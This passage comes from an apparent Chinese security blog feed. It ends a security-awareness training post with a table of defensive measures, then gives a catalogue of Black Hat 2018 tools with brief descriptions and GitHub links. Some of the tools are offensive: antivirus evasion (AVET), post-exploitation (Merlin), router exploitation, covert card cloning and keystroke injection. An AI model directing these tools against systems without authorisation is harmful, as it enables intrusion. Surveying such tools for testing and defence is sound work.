title="十一、信息丢失事件"></a>十一、信息丢失事件</h3><p>　　信息丢失事件是指因误操作、人为蓄意或软硬件缺陷等因素导致信息系统中的信息丢失而导致的信息安全事件。<br>此类事件多由于服务端被攻击或人为失误造成，会在一定程度上影响公众生活。</p><p><strong>影响：</strong></p><ul><li>各种可能的负面后果包括：财产经济损失等。</li></ul><p><strong>案例：</strong></p><ul><li><p>误操作，移动用户数据丢失<br>因华为误操作导致广西80万移动用户数据丢失一事，华为已经被中国移动处以5亿罚款，同时中国移动已经展开全国范围的系统大排查。</p></li><li><p>苹果手机读取权限漏洞<br>苹果macOS系统曾经被曝光允许任何人通过客人账户获得该设备的所有读取权限。不过好在苹果及时做出了补救措施。但事情没过多久，又有一位用户发现了类似的漏洞。</p></li><li><p>数据库被删除数据，以备份勒索<br>数据库被黑并遭勒索，犯罪分子利用数据库配置漏洞进行未授权访问、拷贝、删除数据库内容，并以备份数据威胁受害者、索要赎金。</p></li></ul><p><strong>预防方案：</strong></p><ul><li>重要信息和有价值的资料应定期备份</li><li>定期对电脑进行扫描并及时更新杀毒软件的补丁</li></ul><h3 id="十二、措施"><a href="#十二、措施" class="headerlink" title="十二、措施"></a>十二、措施</h3><table><thead><tr><th>类别</th><th>初级措施</th><th>高级措施</th></tr></thead><tbody><tr><td>系统安装</td><td>1.安装最新版正版操作系统<br>2.启用系统防火墙<br>3.安装系统补丁<br>4.一定要设密码（用户名/密码）<br>5.安装杀毒软件，用杀毒软件做全盘扫描</td><td>1.取消非必要授权<br>2.设备自带防护等级设置为“高”</td></tr><tr><td>数据保护</td><td>1.定期备份文件<br>2.使用office的加密功能保护文档</td><td>1.多因子验证</td></tr><tr><td>正确使用密码</td><td>1.不使用已知不安全密码或常见密码<br>2.最好不要名字、生日、电话号码等<br>3.不要一个密码通用所有帐号<br>4.设置的密码一定要让自己记住</td><td>1.密码应该不少于8个字符<br>2.同时包含多种类型的字符</td></tr><tr><td>第三方软件管理</td><td>1.每种功能的软件尽量选择自己熟悉的一种安装，不要重复安装<br>2.尽量选择规模较大的软件公司出品的第三方软件<br>3.使用正版的第三方软件<br>4.发现第三方软件提示要更新时，请尽快安装</td><td>1.随时关注相关软件的官方网站，发现最新版本及时安装<br>2.确认长时间不需要使用的软件请尽快卸</td></tr><tr><td>邮件安全</td><td>1.如果你不能确认你的邮件是合法并安全的，不要发送<br>2.不要打开陌生人发来的邮件附件，也不要点击邮件中的链接<br>3.不要轻易在网站上留你的公司邮箱或重要私人邮箱<br>4.如果留取你的邮件地址不是获取服务所必需的，不要留取自己的邮件地址</td><td>1.通过邮件发送公司机密/敏感信息、个人隐私信息、或信用卡数据等，此类数据需要保护，即加密后才能发送<br>2.创建不重要的邮件帐号，用于一些网站注册和邮件列表</td></tr><tr><td>无线安全</td><td>1.区分在家登陆和公共场合的登陆<br>2.不要使用不受信的无线网络，使用公有的无线网络传输隐私信息时一定要加密传输<br>3.最好把WiFi连接设置为手动</td><td>1.如果不使用无线，带无线功能的笔记本和手机设备在工作区域应该关闭无线功能，避免攻击者通过设备的无线接入内网</td></tr><tr><td>智能终端安全</td><td>1.不要随意将移动终端连接到内部网络的设备上，哪怕仅仅是充电<br>2.不要随便安装不受信的app<br>3.不用电脑时，一定要关机<br>4.合理处置旧手机</td><td>1.移动终端上存储的隐私信息尽可能的加密存储</td></tr><tr><td>移动存储介质</td><td>1.不使用未知来源的移动存储介质<br>2.使用移动存储介质时，先进行扫描杀毒<br>3.请尽量避免工作移动存储介质和私人的移动存储介质交叉使用</td><td>1.对于安全要求较高的设备，应该仅允许使用特定的移动存储介质<br>2.敏感信息如果要存储在移动介质上，请加密后再存储，并妥善保管该介质。</td></tr><tr><td>购物安全</td><td>1.建议在大型的网购平台进行网购，不要轻易相信各种打着打折，优惠的旗号</td><td>1.在登录购物网站时要核实网站的域名是否正确。谨慎点击商家从即时通讯工具上发送的支付链接</td></tr><tr><td>隐私安全</td><td>1.要在身份证复印件上加添加用途备注<br>2.不要随意在各种网站上留个人信息<br>3.在留取个人信息前仔细阅读网站的隐私保护声明<br>4.不要总把私人账号随意借给别人使用<br>5.平时不要习惯乱用他人的电脑登陆<br>6.登录账号输入密码的时候注意周围是否有人盯着你的输入<br>7.重要的账号在公共场所登陆后要注意退出<br>8.妥善处置快递单、车票、购物小票等包含个人信息的单据<br>9.不在微博、群聊中透露个人信息<br>10.慎重参加网上调查活动</td><td>1.安全意识、使用习惯是首要</td></tr><tr><td>预防诈骗</td><td>1.不要轻易相信别人，尤其是在网络中<br>2.不要随意点击别人发过来的网页链接，尤其是在邮件和即时通讯软件中<br>3.能够自己输入的网址尽量自己输入，而不要直接点击发过来的链接<br>4.邮件中涉及到修改密码的链接不要轻易点击<br>5.在网络上涉及银行卡有关的操作一定要慎重，要仔细查看相关网站的信息（证书、域名等）<br>6.管理员一般不会询问用户的密码，不管在何种场合下（邮件、论坛等）</td><td>1.安全意识、使用习惯是首要</td></tr></tbody></table>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全文档 </tag>
            
            <tag> SDL </tag>
            
            <tag> 培训 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018BlackHat工具</title>
      <link href="/Tools/2018BlackHat%E5%B7%A5%E5%85%B7/"/>
      <url>/Tools/2018BlackHat%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<h3 id="1-Android，iOS和移动黑客"><a href="#1-Android，iOS和移动黑客" class="headerlink" title="1.Android，iOS和移动黑客"></a>1.Android，iOS和移动黑客</h3><ul><li>Vulnerable iOS app: Swift version<br>易受攻击的IOS应用程序（DVIA）旨在为学生、移动安全爱好者和专业人士等提供的一个练习他们的IOS渗透测试技能的平台。目前该程序拥有以下漏洞：<ul><li>1.本地数据存储</li><li>2.越狱检测</li><li>3.过度授权</li><li>4.运行操作</li><li>5.防钩子/调试</li><li>6.二进制防护</li><li>7.指纹/面部识别绕过</li><li>7.钓鱼</li><li>9.旁路数据泄露</li><li>10.IPC问题</li><li>11.加密破环</li><li>12.Webview问题</li><li>13.网络层安全</li><li>14.应用程序修补</li><li>15.内存中敏感信息</li></ul></li></ul><p>　　<a href="https://github.com/prateek147/DVIA-v2" target="_blank" rel="noopener">https://github.com/prateek147/DVIA-v2</a></p><h3 id="2-代码评估"><a href="#2-代码评估" class="headerlink" title="2.代码评估"></a>2.代码评估</h3><ul><li>OWASP dependency check<br>Dependency-Check是一种软件组合分析（SCA）工具，它试图检测项目依赖项中包含的公开披露的漏洞。它通过确定给定依赖项是否存在公共平台枚举（CPE）标识符来完成此操作。如果找到，它将生成链接到相关CVE条目的报告。</li></ul><p>　　<a href="https://github.com/jeremylong/DependencyCheck" target="_blank" rel="noopener">https://github.com/jeremylong/DependencyCheck</a></p><ul><li>Cougar scan<br>Puma Scan是一款.NET软件安全代码分析工具，可在开发团队编写代码时提供实时，持续的源代码分析。在Visual Studio中，漏洞会立即显示在开发环境中作为拼写检查和编译器警告，从而防止安全漏洞进入您的应用程序。Puma Scan还集成到构建中，以便在编译时提供安全性分析。</li></ul><p>　　<a href="https://github.com/pumasecurity/puma-scan" target="_blank" rel="noopener">https://github.com/pumasecurity/puma-scan</a></p><h3 id="3-加密"><a href="#3-加密" class="headerlink" title="3.加密"></a>3.加密</h3><ul><li>DeepViolet: SSL / TLS scanning API and tools<br>DeepViolet是一个用Java编写的TLS / SSL扫描API。该工具支持命令行和图形界面两种使用方式，这两种方式都可用于扫描HTTPS Web服务器以检查服务器证书信任链，撤销状态，检查挂起到期的证书，弱签名算法等等。</li></ul><p>　　<a href="https://github.com/spoofzu/DeepViolet" target="_blank" rel="noopener">https://github.com/spoofzu/DeepViolet</a></p><h3 id="4-数据取证和事件响应"><a href="#4-数据取证和事件响应" class="headerlink" title="4. 数据取证和事件响应"></a>4. 数据取证和事件响应</h3><ul><li>Beginner to expert<br>Bro是一种被动的开源网络流量分析器。它主要是一个安全监视器，可以检查链路上的所有流量，以查看可疑活动的迹象。然而，更一般地，Bro支持甚至在安全域之外的各种流量分析任务，包括性能测量和帮助解决问题。</li></ul><p>　　<a href="https://github.com/bro/bro" target="_blank" rel="noopener">https://github.com/bro/bro</a></p><ul><li>CyBot: Open Source Threat Intelligence Chatbot<br>CyBot是一款开源的威胁情报聊天机器人。用户可以向CyBot提出简单的问题，甚至与其他人员分享结果，而不是去各种网站或仪表板进行研究，这种能力现在是免费的，并且正在积极开发中。</li></ul><p>　　<a href="https://github.com/CylanceSPEAR/CyBot" target="_blank" rel="noopener">https://github.com/CylanceSPEAR/CyBot</a></p><ul><li>LogonTracer<br>LogonTracer是一款用于分析Window活动目录事件日志来调查恶意登录的分析工具。LogonTracer将登录相关事件中的主机名（或IP地址）和帐户名关联起来，并将其显示为图形。这样，就可以看到登录尝试发生在哪个帐户以及使用了哪个主机。</li></ul><p>　　<a href="https://github.com/JPCERTCC/LogonTracer" target="_blank" rel="noopener">https://github.com/JPCERTCC/LogonTracer</a></p><ul><li>Rastrea2r (reload!): Collect and hunt IOC with Gusto and Style<br>rastrea2r是一个多平台开源工具，允许事件响应者和SOC分析师对可疑系统进行分类，并在几分钟内搜索数千个端点上的妥协指标（IOC）。如果要从远程系统（包括内存转储）解析和收集感兴趣的工件，rastrea2r可以跨多个端点执行sysinternal、系统命令和其他第三方工具（包括自定义脚本），将输出结果集中保存方便进行自动或手动分析。通过使用客户端/服务器RESTful API，rastrea2r还可以使用YARA规则在多个系统上搜索磁盘和内存上的IOC。</li></ul><p>　　<a href="https://github.com/rastrea2r/rastrea2r" target="_blank" rel="noopener">https://github.com/rastrea2r/rastrea2r</a></p><ul><li>RedHunt OS (VM): Virtual machine for adversary emulation and threat search<br>RedHunt旨在通过集成攻击者的武器库以及防御者的工具包来积极识别您环境中的威胁，从而成为一站式商店，满足您的所有威胁模拟和威胁搜索需求。</li></ul><p>　　<a href="https://github.com/redhuntlabs/RedHunt-OS" target="_blank" rel="noopener">https://github.com/redhuntlabs/RedHunt-OS</a></p><h3 id="5-反制工具"><a href="#5-反制工具" class="headerlink" title="5.反制工具"></a>5.反制工具</h3><ul><li>AVET: AntiVirus Evasion Tool<br>AVET是一种AntiVirus Evasion工具，旨在使测试人员的更加轻松的结构病毒文件，更有针对性的设计防病毒方案。</li></ul><p>　　<a href="https://github.com/govolution/avet" target="_blank" rel="noopener">https://github.com/govolution/avet</a></p><ul><li>DSP: Docker Security Playground<br>Docker Security Playground主要功能有以下几点：<ul><li>1.创建网络和网络安全方案，便于了解所有网络协议、规则和安全问题</li><li>2.学习渗透测试技术</li><li>3.更加灵活地管理docker-compose项目</li></ul></li></ul><p>　　<a href="https://github.com/giper45/DockerSecurityPlayground" target="_blank" rel="noopener">https://github.com/giper45/DockerSecurityPlayground</a></p><ul><li>hideNsneak: Attack Confusion Framework<br>hideNsneak通过提供快速部署，管理和删除各种云服务的界面，帮助管理渗透测试人员的攻击基础架构。包括虚拟机，域前端，Cobalt Strike服务器，API网关和防火墙。</li></ul><p>　　<a href="https://github.com/rmikehodges/hideNsneak" target="_blank" rel="noopener">https://github.com/rmikehodges/hideNsneak</a></p><ul><li>Merlin<br>Merlin是一种后期利用工具，可以轻松交叉编译以便在任何平台上运行命令，实现对主机的控制。</li></ul><p>　　<a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="noopener">https://github.com/Ne0nd0g/merlin</a></p><ul><li>RouterSploit<br>RouterSploit Framework是一个专用于嵌入式设备的开源开发框架。它拥有以下渗透测试模块：<ul><li>1.exploits - 利用已识别漏洞的模块</li><li>2.creds - 用于测试网络服务凭证的模块</li><li>3.scanners - 检查目标是否容易受到攻击的模块</li><li>4.payloads - 负责为各种体系结构和注入点生成有效载荷的模块</li><li>5.generic - 执行通用攻击的模块</li></ul></li></ul><p>　　<a href="https://github.com/threat9/routersploit" target="_blank" rel="noopener">https://github.com/threat9/routersploit</a></p><h3 id="6-硬件-嵌入式"><a href="#6-硬件-嵌入式" class="headerlink" title="6.硬件/嵌入式"></a>6.硬件/嵌入式</h3><ul><li>ChipWhisperer<br>ChipWhisperer是一个致力于硬件安全研究的开源工具链。该工具链由几层开源组件组成：<ul><li>1.硬件：ChipWhisperer使用一个捕获板和一个目标板。ChipWhisperer-Lite捕获板和许多目标板的原理图和PCB布局是免费提供的。</li><li>2.固件：ChipWhisperer硬件上使用三个独立的固件。捕获板具有USB控制器（在C中）、用于高速捕获的FPGA（在Verilog中）和开源固件。此外，目标设备有自己的固件; 此存储库包含许多针对不同目标的固件示例。</li><li>3.软件：ChipWhisperer软件由用于控制硬件的捕获程序和用于处理捕获数据的分析器程序组成。</li></ul></li></ul><p>　　<a href="https://github.com/newaetech/chipwhisperer" target="_blank" rel="noopener">https://github.com/newaetech/chipwhisperer</a></p><ul><li>JTAGulator: Uncover the Achilles heel of hardware security<br>JTAGulator是一款可帮助识别目标设备上测试点，过孔或元件焊盘的OCD连接的开源硬件工具。</li></ul><p>　　<a href="https://github.com/grandideastudio/jtagulator" target="_blank" rel="noopener">https://github.com/grandideastudio/jtagulator</a></p><ul><li>Micro-Renovator: Bring the processor firmware into the code<br>MicroRenovator提供了一种部署处理器微码的机制，该机制独立于制造商和操作系统提供的更新，通过添加自定义EFI启动脚本，该脚本在操作系统运行之前加载微码。这使操作系统内核能够检测更新的微码并启用，从而修复幽灵漏洞。</li></ul><p>　　<a href="https://github.com/syncsrc/MicroRenovator" target="_blank" rel="noopener">https://github.com/syncsrc/MicroRenovator</a></p><ul><li>TumbleRF: RF Blur becomes easy<br>TumbleRF是一个模糊测试框架，用于构建面向RF模糊测试的应用。TumbleRF旨在通过提供API以跨协议，无线电和驱动程序统一这些技术来实现RF模糊测试。</li></ul><p>　　<a href="https://github.com/riverloopsec/tumblerf" target="_blank" rel="noopener">https://github.com/riverloopsec/tumblerf</a></p><ul><li>Walrus: Make the most of your card cloning device<br>Walrus是一款适用于非接触式卡片克隆设备的Android应用程序，如Proxmark3和Chameleon Mini。使用Google Pay风格的简单界面，可以将访问控制卡读入钱包，以便稍后编写或模拟。<br>Walrus专为红队参与期间的物理安全评估人员而设计，支持基本任务，如读卡，写入和仿真，以及特定于设备的功能，如天线调谐和设备配置。诸如位置标记之类的更高级功能使得处理多个目标变得容易，而批量读取允许在接近目标时秘密地捕获多个卡。</li></ul><p>　　<a href="https://github.com/TeamWalrus/Walrus" target="_blank" rel="noopener">https://github.com/TeamWalrus/Walrus</a></p><h3 id="7-物联网"><a href="#7-物联网" class="headerlink" title="7.物联网"></a>7.物联网</h3><ul><li>Scalable Dynamic Analysis Framework for IoT Devices<br>DECAF是一个基于QEMU的二进制分析平台。这也是DroidScope动态Android恶意软件分析平台的基础。支持：即时虚拟机内部审计、精确无损的内核污染、事件驱动的编程接口、动态设备管理等功能。</li></ul><p>　　<a href="https://github.com/sycurelab/DECAF" target="_blank" rel="noopener">https://github.com/sycurelab/DECAF</a></p><ul><li>BLE CTF project<br>BLE CTF可以帮助用户学习蓝牙低功耗客户端和服务器交互的核心概念，从而学习如何通过蓝牙入侵。</li></ul><p>　　<a href="https://github.com/hackgnar/ble_ctf" target="_blank" rel="noopener">https://github.com/hackgnar/ble_ctf</a></p><ul><li>WHID Syringe and WHID Elite: Next Generation HID Aggressive Device<br>WHID注入器允许通过Wi-Fi将键入信息发送到目标机器。目标将Ducky识别为标准HID键盘和串行端口，从而允许远程执行目标上的交互式命令和脚本。</li></ul><p>　　<a href="https://github.com/whid-injector/WHID" target="_blank" rel="noopener">https://github.com/whid-injector/WHID</a></p><h3 id="8-恶意软件防御"><a href="#8-恶意软件防御" class="headerlink" title="8.恶意软件防御"></a>8.恶意软件防御</h3><ul><li>Provides advanced deep learning analysis platform for every security researcher<br>这是一个用于演示安全研究机器学习即服务（MLaaS）的Web平台。它有一个机器学习（ML）管道来构建和调整模型。它还有一个演示对抗性ML和对策的门户。</li></ul><p>　　<a href="https://github.com/intel/Resilient-ML-Research-Platform" target="_blank" rel="noopener">https://github.com/intel/Resilient-ML-Research-Platform</a></p><ul><li>EKTotal<br>EKTotal是一个可以自动分析Drive-by Download攻击的流量的集成分析工具。它可以识别四种类型的漏洞利用工具包，如RIG和Magnitude，以及十多种类型的攻击方式，如Seamless和Fobos。EKTotal还可以提取漏洞利用代码和恶意软件。</li></ul><p>　　<a href="https://github.com/nao-sec/ektotal" target="_blank" rel="noopener">https://github.com/nao-sec/ektotal</a></p><ul><li>Firmware Audit: Platform Firmware Security Automation for Blue Teams and DFIR<br>固件审核（fwaudit）是一个平台固件测试实用程序。它运行测试并收集有关系统固件，日期和哈希输出的诊断和安全信息，以用于取证和事件响应。</li></ul><p>　　<a href="https://github.com/PreOS-Security/fwaudit" target="_blank" rel="noopener">https://github.com/PreOS-Security/fwaudit</a></p><ul><li>MaliceIO<br>VirusTotal的免费开源版本</li></ul><p>　　<a href="https://github.com/maliceio/malice" target="_blank" rel="noopener">https://github.com/maliceio/malice</a></p><ul><li>Goal — see MacOS Security Tools<br>Objective-See旨在提供永久免费并且简单而有效的OS X安全工具。</li></ul><p>　　<a href="https://github.com/objective-see" target="_blank" rel="noopener">https://github.com/objective-see</a></p><h3 id="9-恶意软件进攻"><a href="#9-恶意软件进攻" class="headerlink" title="9.恶意软件进攻"></a>9.恶意软件进攻</h3><ul><li>BloodHound 1.5<br>BloodHound是一个单页的Javascript Web应用程序，构建在Linkurious之上，使用Electron编译，其中一个Neo4j数据库由PowerShell摄取器提供。<br>BloodHound使用图论来揭示Active Directory环境中隐藏的且通常是非预期的关系。攻击者可以使用BloodHound轻松识别高度复杂的攻击路径。防御者可以使用BloodHound来识别和消除那些相同的攻击路径。蓝队和红队都可以使用BloodHound轻松深入了解Active Directory环境中的权限关系。</li></ul><p>　　<a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></p><h3 id="10-网络攻击"><a href="#10-网络攻击" class="headerlink" title="10.网络攻击"></a>10.网络攻击</h3><ul><li>armory<br>Armory是一种用于从许多工具中获取大量外部和发现数据，将其添加到数据库并关联所有相关信息的工具。它旨在从各种工具中获取信息用于其他工具。</li></ul><p>　　<a href="https://github.com/depthsecurity/armory" target="_blank" rel="noopener">https://github.com/depthsecurity/armory</a></p><ul><li>Chiron: An advanced IPv6 security assessment and penetration testing framework<br>Chiron是一个IPv6安全评估框架，用Python编写并使用Scapy。它由以下模块组成：<ul><li>1.IPv6扫描程序</li><li>2.IPv6本地链接</li><li>3.IPv4到IPv6代理</li><li>4.IPv6攻击模块</li><li>5.IPv6代理</li></ul></li></ul><p>　　<a href="https://github.com/aatlasis/Chiron" target="_blank" rel="noopener">https://github.com/aatlasis/Chiron</a></p><ul><li>DELTA: SDN Security Assessment Framework<br>DELTA是一种渗透测试框架，可为不同的测试用例重新生成已知的攻击方案。该框架还提供了通过使用模糊测试技术在SDN中发现未知安全问题的能力。</li></ul><p>　　<a href="https://github.com/OpenNetworkingFoundation/DELTA" target="_blank" rel="noopener">https://github.com/OpenNetworkingFoundation/DELTA</a></p><ul><li>Mallet: Intercepting agent for any protocol<br>Mallet是一种更为通用的用于为任意协议创建代理的工具。</li></ul><p>　　<a href="https://github.com/sensepost/mallet" target="_blank" rel="noopener">https://github.com/sensepost/mallet</a></p><ul><li>PowerUpSQL: PowerShell Toolkit for attacking SQL Server in an enterprise<br>PowerUpSQL包括支持SQL Server发现，弱配置审计，规模特权升级以及OS命令执行等后期利用操作的功能。它旨在用于内部渗透测试和红队测试，此外管理员还可以用它快速清点其ADS域中的SQL Server，并执行与SQL Server相关的常见威胁搜索任务。</li></ul><p>　　<a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a></p><ul><li>WarBerryPi<br>WarBerryPi在红队中被用作硬件植入设备。只需找到一个网络端口并将其接入，便可以在短时间内尽可能多地获取信息。</li></ul><p>　　<a href="https://github.com/secgroundzero/warberry" target="_blank" rel="noopener">https://github.com/secgroundzero/warberry</a></p><h3 id="11-网络防御"><a href="#11-网络防御" class="headerlink" title="11.网络防御"></a>11.网络防御</h3><ul><li>ANWI (New Wireless IDS): $5 WIDS<br>ANWI是一种新型无线入侵检测系统，它基于低成本的Wi-Fi模块（ESP8266），可以部署在覆盖区域的物理周边。它使那些无法负担昂贵的WIDS解决方案的组织能够以很低的成本保护他们的网络。</li></ul><p>　　<a href="https://github.com/SanketKarpe/anwi" target="_blank" rel="noopener">https://github.com/SanketKarpe/anwi</a></p><ul><li>CHIRON: Home-based network analysis and machine learning threat detection framework<br>CHIRON是基于ELK堆栈和机器学习威胁检测框架AKTAION的网络安全分析工具。CHIRON解析并显示来自P0f，Nmap和BRO IDS的数据。CHIRON专为家庭环境而设计，可让您更好地了解家庭互联网设备（物联网，电脑，手机，平板电脑等）存在的风险。</li></ul><p>　　<a href="https://github.com/jzadeh/chiron-elk" target="_blank" rel="noopener">https://github.com/jzadeh/chiron-elk</a></p><ul><li>Cloud Security Suite: One-stop tool for AWS / GCP / Azure security auditing at<br>CS Suite是用于审核AWS基础架构的安全状态的一站式工具。CS Suite利用当前的开源工具功能，并将其他缺失的检查添加到一个工具中更加便于管理。</li></ul><p>　　<a href="https://github.com/SecurityFTW/cs-suite" target="_blank" rel="noopener">https://github.com/SecurityFTW/cs-suite</a></p><ul><li>DejaVu: An open source spoofing framework<br>DejaVu是一个开源欺骗框架。防御者可以使用它在不同VLAN的网络上战略性地部署多个交互式诱饵（HTTP服务器，SQL，SMB，FTP，SSH，客户端 - NBNS）。为了简化诱饵的管理，框架还提供了web管理界面，可用于从集中控制台有效地部署，管理和配置所有诱饵。记录和警报仪表板显示有关生成的警报的详细信息，并可进一步配置如何处理这些警报。</li></ul><p>　　<a href="https://github.com/bhdresh/Dejavu" target="_blank" rel="noopener">https://github.com/bhdresh/Dejavu</a></p><h3 id="12-OSINT-–-开源智能"><a href="#12-OSINT-–-开源智能" class="headerlink" title="12.OSINT – 开源智能"></a>12.OSINT – 开源智能</h3><ul><li>DataSploit 2.0<br>DataSploit是一款用于处理公开来源情报（OSINT）的辅助工具，具有以下功能：<ul><li>1.对域名/电子邮件/用户名/IP进行检索，并从不同来源查找相关信息。</li><li>2.关联并处理结果，以统一的方式展示它们。</li><li>3.试图找出与目标相关的凭证，api-key，令牌，子域，域名历史，旧门户等。</li><li>4.对特定数据使用特定脚本自动收集OSINT。</li><li>5.对收集的数据进行有效性验证。</li><li>6.生成HTML、JSON或txt格式的报告。</li></ul></li></ul><p>　　<a href="https://github.com/DataSploit/datasploit" target="_blank" rel="noopener">https://github.com/DataSploit/datasploit</a></p><ul><li>Dradis framework: Learn how to reduce reporting time by half<br>Dradis是一个专为InfoSec团队量身定制的开源协作框架，。</li></ul><p>　　<a href="https://github.com/dradis/dradis-ce" target="_blank" rel="noopener">https://github.com/dradis/dradis-ce</a></p><h3 id="13-逆向工程"><a href="#13-逆向工程" class="headerlink" title="13.逆向工程"></a>13.逆向工程</h3><ul><li>Snake: Malware Storage Zoo<br>Snake是一个恶意软件存储容器。Snake旨在提供足够的信息，使分析师能够快速有效地选择最适合手头任务的工具。此外它还提供了从静态分析到与外部服务交互的各种功能。</li></ul><p>　　<a href="https://github.com/countercept/snake" target="_blank" rel="noopener">https://github.com/countercept/snake</a></p><h3 id="14-智能电网-工业安全"><a href="#14-智能电网-工业安全" class="headerlink" title="14.智能电网/工业安全"></a>14.智能电网/工业安全</h3><ul><li>GRFICS: Graphic Realism Framework for Industrial Control Simulation<br>GRFICS是用于工业控制模拟的图形框架，它使用Unity 3D游戏引擎图形来降低工业控制系统安全性的进入门槛。GRFICS为用户提供完整的虚拟工业控制系统（ICS）网络，支持常见攻击，包括命令注入，中间人和缓冲区溢出，并通过对3D可视化更加直观地展示攻击的影响。此外用户还可以通过使用强大的防火墙规则正确隔离网络或编写入侵检测规则来练习其防御技能。</li></ul><p>　　<a href="https://github.com/djformby/GRFICS" target="_blank" rel="noopener">https://github.com/djformby/GRFICS</a></p><h3 id="15-漏洞评估"><a href="#15-漏洞评估" class="headerlink" title="15.漏洞评估"></a>15.漏洞评估</h3><ul><li>Robustness Toolbox for Machine Learning Models<br>adversarial-robustness-toolbox一个致力于对抗性机器学习的工具箱。旨在帮助研究人员快速构建用于分析的攻击和防御方法的机器学习模型。它还提供了许多最新的攻击和防御类型。</li></ul><p>　　<a href="https://github.com/IBM/adversarial-robustness-toolbox" target="_blank" rel="noopener">https://github.com/IBM/adversarial-robustness-toolbox</a></p><ul><li>Android Dynamic Analysis Tool (ADA)<br>这是一款基于安卓的动态分析工具</li></ul><p>　　<a href="https://github.com/ANELKAOS/ada" target="_blank" rel="noopener">https://github.com/ANELKAOS/ada</a></p><ul><li>Archery: Open Source Vulnerability Assessment and Management<br>Archery是一个开源漏洞评估和管理工具，可帮助开发人员和测量人员执行扫描和管理漏洞。Archery使用流行的开源工具对Web应用程序和网络执行全面扫描。它还执行Web应用程序动态验证扫描，并使用selenium覆盖整个应用程序。开发人员还可以利用该工具实现其DevOps CI / CD环境。</li></ul><p>　　<a href="https://github.com/archerysec/archerysec" target="_blank" rel="noopener">https://github.com/archerysec/archerysec</a></p><ul><li>Boofuzz<br>Boofuzz是古老的Sulley模糊框架的一个分支和继承者。它修复了许多错误并且提升了可扩展性。</li></ul><p>　　<a href="https://github.com/jtpereyda/boofuzz" target="_blank" rel="noopener">https://github.com/jtpereyda/boofuzz</a></p><ul><li>BTA<br>BTA是一个开源的Active Directory安全审计框架。能够帮助审计人员获取以下信息：<ul><li>1.目标对象（计算机、用户帐户等）的权限</li><li>2.访问邮箱的权限</li><li>3.域管理员权限的帐户信息</li><li>4.扩展权限信息等</li><li>5.两个时间点之间AD发生的变化</li></ul></li></ul><p>　　<a href="https://github.com/airbus-seclab/bta" target="_blank" rel="noopener">https://github.com/airbus-seclab/bta</a></p><ul><li>Take advantage of<br>DeepExploit是与Metasploit链接的全自动渗透测试工具。DeepExploit标识目标服务器上所有已打开端口的状态，并使用机器学习以精确的方式进行漏洞攻击。它的主要特性有这几点：高效的漏洞利用、深入渗透、自学习和训练时间短。</li></ul><p>　　<a href="https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit" target="_blank" rel="noopener">https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit</a></p><ul><li>Halcyon IDE: for Nmap script developers<br>Halcyon IDE可以快速轻松地开发Nmap脚本，以便在应用程序和基础架构上执行高级扫描。它是第一个专门为Nmap脚本开发发布的IDE。</li></ul><p>　　<a href="https://github.com/s4n7h0/Halcyon" target="_blank" rel="noopener">https://github.com/s4n7h0/Halcyon</a></p><ul><li>SimpleRisk<br>SimpleRisk是一款开源工具，它可以帮助安全专家们管控存在风险的管理行为。SimpleRisk向用户呈现了一个风险管理控制面板，上面显示了系统，团队和安全技术的状态以及正在进行中的风险化解项目。</li></ul><p>　　<a href="https://github.com/simplerisk" target="_blank" rel="noopener">https://github.com/simplerisk</a></p><ul><li>TROMMEL<br>TROMMEL可用于筛选嵌入式设备文件，以识别潜在的易受攻击的指标。</li></ul><p>　　<a href="https://github.com/CERTCC/trommel" target="_blank" rel="noopener">https://github.com/CERTCC/trommel</a></p><h3 id="16-Web-AppSec"><a href="#16-Web-AppSec" class="headerlink" title="16.Web AppSec"></a>16.Web AppSec</h3><ul><li>Take a look at NGINX’s ModSec 3.0: Software Web Application Firewall<br>ModSecurity是一个Web应用程序防火墙引擎，支持用户自定义配置和规则。</li></ul><p>　　<a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><ul><li>Astra: Automatic security testing of the REST API<br>Astra可以让安全工程师或开发人员用到开发流程中，他们可以在开发周期的早期检测和修补漏洞。Astra可以自动检测和测试登录和注销（Authentication API），因此任何人都可以轻松地将其集成到CICD通道中。</li></ul><p>　　<a href="https://github.com/flipkart-incubator/Astra" target="_blank" rel="noopener">https://github.com/flipkart-incubator/Astra</a></p><ul><li>Burp Replicator: Replication of automated complex vulnerabilities<br>Replicator是一个Burp扩展，可帮助开发人员重现渗透测试问题。渗透测试器生成一个包含报告结论的Replicator文件。测试人员将Replicator文件发送到客户端，就可以在Burp中打开该文件并复现问题。</li></ul><p>　　<a href="https://github.com/PortSwigger/replicator" target="_blank" rel="noopener">https://github.com/PortSwigger/replicator</a></p><ul><li>OWASP offensive web testing framework<br>WASP OWTF是一个专注于渗透和安全测试、OWASP测试（v3和v4）、OWASP Top 10、PTES和NIST等安全标准的Web测试框架。该工具高度可配置，任何人都可以在配置文件中轻松创建简单的插件或添加新测试，无需任何开发经验。</li></ul><p>　　<a href="https://github.com/owtf/owtf" target="_blank" rel="noopener">https://github.com/owtf/owtf</a></p><ul><li>OWASP JoomScan project<br>OWASP Joomla是一个开源漏洞扫描程序，旨在自动执行Joomla CMS部署中的漏洞检测和可靠性保证任务。它不仅可以检测已知的攻击性漏洞，还能够检测到许多错误配置和管理员级别的缺陷。此外，OWASP JoomScan提供了用户友好的界面，并以文本和HTML格式输出报告。</li></ul><p>　　<a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">https://github.com/rezasp/joomscan</a></p><ul><li>WSSAT<br>SSAT是一个开源Web服务安全扫描工具，它通过编辑配置文件提供动态环境来添加，更新或删除漏洞。此工具接受WSDL地址列表作为输入文件，针对每个服务进行安全漏洞静态和动态测试。</li></ul><p>　　<a href="https://github.com/YalcinYolalan/WSSAT" target="_blank" rel="noopener">https://github.com/YalcinYolalan/WSSAT</a></p>]]></content>
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
